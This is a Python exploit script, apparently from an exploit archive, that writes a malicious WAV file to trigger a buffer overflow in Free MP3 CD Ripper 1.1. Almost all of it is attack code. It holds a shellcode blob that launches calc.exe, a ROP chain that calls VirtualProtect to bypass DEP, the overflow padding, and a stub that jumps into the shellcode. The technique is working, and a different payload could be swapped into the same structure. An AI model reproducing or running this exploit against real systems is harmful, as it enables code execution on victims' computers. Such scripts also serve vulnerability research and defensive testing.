#!/usr/bin/python
#
#[+]Exploit Title: Free MP3 CD Ripper 1.1 Universal DEP Bypass Exploit
#[+]Date: 27\08\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://www.brothersoft.com/free-mp3-cd-ripper-84543.html
#[+]Found/Initial Exploit: X-h4ck(http://www.exploit-db.com/exploits/17727/)
#[+]Version: 1.1
#[+]Tested On: WIN-XP SP3 Brazilian Portuguese
#[+]CVE: N/A
#

from struct import pack
from time import sleep
import os
from sys import exit

print '''
 
      		  Created By C4SS!0 G0M3S
     		  E-mail louredo_@hotmail.com
      		  Blog net-fuzzer.blogspot.com
'''
sleep(2)

shellcode = ("\xdd\xc3\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x32\xb8\x08\x99" 
"\xc4\xb4\x31\x43\x17\x03\x43\x17\x83\xcb\x9d\x26\x41\x37" 
"\x75\x2f\xaa\xc7\x86\x50\x22\x22\xb7\x42\x50\x27\xea\x52" 
"\x12\x65\x07\x18\x76\x9d\x9c\x6c\x5f\x92\x15\xda\xb9\x9d" 
"\xa6\xea\x05\x71\x64\x6c\xfa\x8b\xb9\x4e\xc3\x44\xcc\x8f"  # Shellcode WinExec "Calc.exe"
"\x04\xb8\x3f\xdd\xdd\xb7\x92\xf2\x6a\x85\x2e\xf2\xbc\x82"  # BadChars "\x00\x0a\x0d"
"\x0f\x8c\xb9\x54\xfb\x26\xc3\x84\x54\x3c\x8b\x3c\xde\x1a" 
"\x2c\x3d\x33\x79\x10\x74\x38\x4a\xe2\x87\xe8\x82\x0b\xb6" 
"\xd4\x49\x32\x77\xd9\x90\x72\xbf\x02\xe7\x88\xbc\xbf\xf0" 
"\x4a\xbf\x1b\x74\x4f\x67\xef\x2e\xab\x96\x3c\xa8\x38\x94"
"\x89\xbe\x67\xb8\x0c\x12\x1c\xc4\x85\x95\xf3\x4d\xdd\xb1" 
"\xd7\x16\x85\xd8\x4e\xf2\x68\xe4\x91\x5a\xd4\x40\xd9\x48" 
"\x01\xf2\x80\x06\xd4\x76\xbf\x6f\xd6\x88\xc0\xdf\xbf\xb9" 
"\x4b\xb0\xb8\x45\x9e\xf5\x37\x0c\x83\x5f\xd0\xc9\x51\xe2" 
"\xbd\xe9\x8f\x20\xb8\x69\x3a\xd8\x3f\x71\x4f\xdd\x04\x35" 
"\xa3\xaf\x15\xd0\xc3\x1c\x15\xf1\xa7\xc3\x85\x99\x27")
#######################ROP START HERE#######################################
rop = pack('<L',0x6f483d9b) # PUSH ESP # POP EBP # RETN
rop += pack('<L',0x004a7252) # XCHG EAX,EBP # RETN
rop += pack('<L',0x0047855b) # XCHG EAX,ECX # RETN
rop += pack('<L',0x00494277) # POP EAX # RETN
rop += pack('<L',0x00CA2108) # PTR to VirtualProtect
rop += pack('<L',0x10007584) # POP EDI # RETN 
rop += pack('<L',0x00493b99) # RETN
rop += pack('<L',0x10013cb1) # POP ESI # RETN
rop += pack('<L',0x00C81C02) # PTR to JMP[EAX]
rop += pack('<L',0x00453cc7) # POP EBP # RETN
rop += pack('<L',0x100081cd) # ADD ESP,24 # RETN // Return of function VirtualProtect
rop += pack('<L',0x00493b98) # POP EBX # RETN
rop += pack('<L',0x000000db) # Valor de dwSize
rop += pack('<L',0x004b0609) # POP EDX # RETN
rop += pack('<L',0x00000040) # Valor de flNewProtect
rop += pack('<L',0x004c8dc0) # PUSHAD # RETN 
rop += ("A" * 32)
rop += pack('<L',0x00463BE9) # JMP to Shellcode
#######################ROP END HERE#########################################
#Note:
#Here we have control of 219 bytes of memory, is not a good space. :)
#So our solution would be: call the function VirtualProtect pointing to inicion 4112 bytes of the file. 
#Now that control the 219-byte one, a good space
#to a function call VirtualProtect and its parameter. ;)
############################################################################
buf = ("\x90" * 50)
buf += shellcode
buf += ("A" * (4112-len(buf)))
buf += rop
buf += (
"\x54" # PUSH ESP
"\x6A\x40" # PUSH 40
"\x66\xB8\x50\x10" # MOV AX,1050
"\x50" # PUSH EAX
"\x8B\xCC" # MOV ECX,ESP
"\x2B\xC8" # SUB ECX,EAX
"\x8B\xD9" # MOV EBX,ECX
"\x51" # PUSH ECX
"\xFF\x15\x08\x21\xCA\x00" # CALL DWORD PTR DS:[Kernel32.VirtualProtect]
"\xFF\xD3") # CALL EBX // Jmp to My Shellcode after call VirtualProtect

print "\t\t[+]Creating Exploit File..."
sleep(1)
try:
    f = open("Exploit.wav","wb")
    f.write(buf)
    f.close()
    print "\t\t[+]File \"Exploit.wav\" Created Succefully."
    sleep(1)
except IOError,e:
    print "\t\t[+]Error: "+str(e)
    exit(-1)
